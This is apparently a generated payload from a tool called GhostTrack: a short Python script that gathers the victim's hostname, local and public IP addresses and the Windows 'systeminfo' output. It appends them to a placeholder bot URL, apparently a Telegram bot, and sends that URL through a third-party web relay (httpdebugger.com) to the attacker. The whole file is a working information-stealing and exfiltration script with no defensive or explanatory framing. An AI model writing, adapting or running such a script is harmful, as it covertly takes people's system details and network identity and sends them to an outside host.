# GhostTrack Generated File

import requests
import subprocess
import socket
from colorama import Fore,init

init()

hust_name = socket.gethostname()
lokal_ip =socket.gethostbyname(hust_name)

lokal = ("Your Local IP >>>"+Fore.LIGHTRED_EX+lokal_ip)
https = requests.get("https://api.ipify.org/").text


http =("Your IP Publik >>>"+Fore.LIGHTRED_EX+https)

hme = lokal+http

informtion= subprocess.getoutput("systeminfo")

a = (informtion[0:1550])
       

#add the bot url

url = "your bot token and chat id url"+str(a+hme)
               
info = { "UrlBox":url,
      "AgentList":"Mozilla Firefox",
      "VersionsList":" HTTP/1.1",
      "MethodList":"GET"
}

http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=info)
